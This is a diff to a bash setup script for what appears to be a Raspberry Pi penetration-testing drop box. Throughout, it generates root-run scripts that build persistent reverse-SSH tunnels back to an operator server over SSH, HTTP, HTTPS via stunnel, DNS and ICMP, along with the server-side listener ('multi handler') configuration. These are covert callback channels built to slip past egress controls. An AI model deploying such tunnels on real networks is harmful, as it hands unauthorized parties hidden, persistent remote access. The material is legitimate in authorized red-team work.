@@ -322,24 +322,24 @@ cat <<EOF > "/root/server_autoconfig.sh"
 #  Script to perform Server Multi Handler setup               #
 # ------------------------------------------------------------#
 
- if [ "$1" == "-h" ]; then
-        echo "Configures and starts all Reverse SSH Receiver tunnel listeners."
-        exit 0
+if [ "\$1" == "-h" ]; then
+    echo "Configures and starts all Reverse SSH Receiver tunnel listeners."
+    exit 0
 fi
-if [[ $EUID -ne 0 ]]; then
+if [[ \$EUID -ne 0 ]]; then
    echo "This script must be run as root" 1>&2
    exit 1
 fi
 # Generate SSH server keypair if needed
-files=$(ls /etc/ssh/*_key 2> /dev/null | wc -l)
-if [ "$files" != "0" ]; then
+files=\$(ls /etc/ssh/*_key 2> /dev/null | wc -l)
+if [ "\$files" != "0" ]; then
         echo "[-] SSHd server keys already exist. Skipping generation..."
  else
         echo "[+] Generating SSHd server keys..."
         sshd-generate
 fi
 # Kill any active tunnel connections & listeners
-for i in `netstat -lntup |grep rasppi |awk '{print$7}' |awk -F"/" '{print$1}'`; do kill $i ; done
+for i in \`netstat -lntup |grep rasppi |awk '{print$7}' |awk -F"/" '{print\$1}'\`; do kill \$i ; done
 killall ptunnel
 killall stunnel
 killall dns2tcpd
@@ -347,24 +347,25 @@ killall hts
 # Start/restart Backtrack SSH server
 echo "[+] Restarting SSHD..." /etc/init.d/ssh restart
 # Create rasppi user account if needed
-cut -d: -f1 /etc/passwd | grep "rasppi" > /dev/null
-OUT=$?
-if [ $OUT -eq 0 ];then
-        echo "[-] User 'rasppi' already exists. Skipping." else
-        echo "[+] Adding 'rasppi' user account..."
-        useradd -m rasppi
-fi
+#cut -d: -f1 /etc/passwd | grep "rasppi" > /dev/null
+#OUT=\$?
+#if [ \$OUT -eq 0 ];then
+#        echo "[-] User 'rasppi' already exists. Skipping." else
+#        echo "[+] Adding 'rasppi' user account..."
+#        useradd -m rasppi
+#fi
 # Make rasppi user .ssh directory if needed
-if [ ! -d "/home/rasppi/.ssh" ]; then
-        mkdir -p /home/rasppi/.ssh
-fi
+#if [ ! -d "/home/rasppi/.ssh" ]; then
+#        mkdir -p /home/rasppi/.ssh
+#fi
 # Copy rasppi user SSH public key to authorized_keys
-#echo "$rasppi_user_ssh_key" > /home/rasppi/.ssh/authorized_keys
+#echo "\$rasppi_user_ssh_key" > /home/rasppi/.ssh/authorized_keys
 # Configure & start Reverse-SSH-over-HTTP listener
 if [ -e "/usr/bin/hts" ]; then
         echo "[-] HTTPTunnel is already installed."
         echo "[+] Starting Reverse-SSH-over-HTTP (HTTPtunnel) listener..."
-        hts -F 0.0.0.0:22 80 & else
+        hts -F 0.0.0.0:22 80 & 
+    else
         echo "[+] Installing HTTPtunnel via apt..."
         apt-get --force-yes --yes -qq install httptunnel
         echo "[+] Starting Reverse-SSH-over-HTTP (HTTPtunnel) listener..."
@@ -383,7 +384,7 @@ if [ -d "/root/stunnel/" ]; then
         openssl req -new -key pwn_key.pem -out pwn.csr
         openssl x509 -req -in pwn.csr -out pwn_cert.pem -signkey pwn_key.pem -days 1825
         cat pwn_cert.pem >> pwn_key.pem
-        #cd $DIR
+        #cd \$DIR
         echo "[+] SSL certificate created. Configuring stunnel.conf..."
         echo -e "cert = /root/stunnel/pwn_key.pem\nchroot = /var/tmp/stunnel\npid = /stunnel.pid\nsetuid = root\nsetgid = root\nclient = no\n[22]\naccept = 443\nconnect = 22" >> /root/stunnel/stunnel.conf
         mkdir /var/tmp/stunnel
@@ -408,8 +409,8 @@ fi
         echo "[+] Setup Complete." 
         echo "[+] Press ENTER to listen for incoming connections..." 
         read INPUT 
-        watch -d "netstat -lntup4 | grep 'pwn' | grep 333"
-
+#        watch -d "netstat -lntup4 | grep 'pwn' | grep 333"
+        netstat -lntup4
 EOF
 
 cat /root/server_autoconfig.sh | ssh $SERVUSR@$SERVER "cat - >> ~/server_autoconfig.sh"
@@ -418,22 +419,22 @@ cat /root/server_autoconfig.sh | ssh $SERVUSR@$SERVER "cat - >> ~/server_autocon
 ##### Create revssh script
 cat <<EOF > "/root/revssh.sh"
 #!/bin/sh
-# $REMOTE_HOST is the name of the remote system
+# \$REMOTE_HOST is the name of the remote system
 REMOTE_HOST=$SERVER
  
 # Setting username for home box
 USER_NAME=$SERVUSR
 SSH_Port=$SSHPort
 
-# $PIVOT_PORT is the remote port number that will be used to tunnel
+# \$PIVOT_PORT is the remote port number that will be used to tunnel
 # back to this system
 PIVOT_PORT=${ReverseSSHPivotPort} 
 
 EOF
 cat <<\EOF >> "/root/revssh.sh"
 
-Tunnel_status=`ps -C ssh -o pid,args |grep -o "${PIVOT_PORT}:localhost:22"`
-AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${PIVOT_PORT}" |awk '{print$1}'`
+Tunnel_status=\`ps -C ssh -o pid,args |grep -o "${PIVOT_PORT}:localhost:22"\`
+AUTOSSH_PID=\`ps -C autossh -o pid,args |grep "autossh -2NR ${PIVOT_PORT}" |awk '{print$1}'`
 SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${PIVOT_PORT}:localhost:22" |awk '{print$1}'`
 
 
@@ -472,7 +473,7 @@ cat <<EOF > "/root/httpssh.sh"
 #Proxy_auth_user=
 #Proxy_auth_password=
 
-# $REMOTE_HOST is the name of the remote system
+# \$REMOTE_HOST is the name of the remote system
 REMOTE_HOST=$SERVER
  
 # Setting username for home box
@@ -507,7 +508,9 @@ export AUTOSSH_PIDFILE=/var/run/HTTP_autossh.pid
 
 # Add iptables rule if not present
 if [ "${iptables_rule_status}" == "tcp dpt:7777" ] ; then echo "iptables rule present" ; \
-else iptables -A INPUT -i eth0 -p tcp --dport 7777 -j DROP
+else 
+iptables -A INPUT -i eth1 -p tcp --dport 7777 -j DROP
+iptables -A INPUT -i eth2 -p tcp --dport 7777 -j DROP
 fi
 
 # If tunnel already established, do nothing. If not, attempt connect.
@@ -537,13 +540,13 @@ EOF
 ##### Create httpsssh script
 cat <<EOF > "/root/httpsssh.sh"
 #!/bin/sh
-# $REMOTE_HOST is the name of the remote system
+# \$REMOTE_HOST is the name of the remote system
 REMOTE_HOST=$SERVER
  
 # Setting username for home box
 USER_NAME=$SERVUSR
  
-# $PIVOT_PORT is the remote port number that will be used to tunnel
+# \$PIVOT_PORT is the remote port number that will be used to tunnel
 # back to this system
 PIVOT_PORT=${HTTPSSSHPivotPort}
  
@@ -596,13 +599,13 @@ EOF
 ##### Create dnsssh script
 cat <<EOF > "/root/dnsssh.sh"
 #!/bin/sh
-# $REMOTE_HOST is the name of the remote system
+# \$REMOTE_HOST is the name of the remote system
 REMOTE_HOST=$SERVER
  
 # Setting username for home box
 USER_NAME=$SERVUSR
  
-# $PIVOT_PORT is the remote port number that will be used to tunnel
+# \$PIVOT_PORT is the remote port number that will be used to tunnel
 # back to this system
 PIVOT_PORT=${DNSSSHPivotPort}
  
@@ -644,13 +647,13 @@ EOF
 ##### Create icmpssh script
 cat <<EOF > "/root/icmpssh.sh"
 #!/bin/sh
-# $REMOTE_HOST is the name of the remote system
+# \$REMOTE_HOST is the name of the remote system
 REMOTE_HOST=$SERVER
  
 # Setting username for home box
 USER_NAME=$SERVUSR
  
-# $PIVOT_PORT is the remote port number that will be used to tunnel
+# \$PIVOT_PORT is the remote port number that will be used to tunnel
 # back to this system
 PIVOT_PORT=${ICMPSSHPivotPort}
  
@@ -676,7 +679,9 @@ export AUTOSSH_PIDFILE=/var/run/ICMP_autossh.pid
 
 # Add iptables rule if not present
 if [ "${iptables_rule_status}" == "tcp dpt:7776" ] ; then echo "iptables rule present" ; \
-else iptables -A INPUT -i eth0 -p tcp --dport 7776 -j DROP
+else 
+    iptables -A INPUT -i eth1 -p tcp --dport 7776 -j DROP
+    iptables -A INPUT -i eth2 -p tcp --dport 7776 -j DROP
 fi
 
 # If tunnel already established, do nothing. If not, attempt connect.
@@ -687,7 +692,8 @@ kill ${SSH_ChildProcess_PID}; \
 killall ptunnel ; \
 sleep 1
 
-ptunnel -lp 7776 -p "$REMOTE_HOST" -da "$REMOTE_HOST" -dp 22 -c eth0 & \
+#ptunnel -lp 7776 -p "$REMOTE_HOST" -da "$REMOTE_HOST" -dp 22 -c eth1 & \
+ptunnel -lp 7776 -p "$REMOTE_HOST" -da "$REMOTE_HOST" -dp 22 & \
 sleep 1
 autossh -2NR ${PIVOT_PORT}:localhost:22 "$USER_NAME"@localhost -p 7776 ; \
 fi
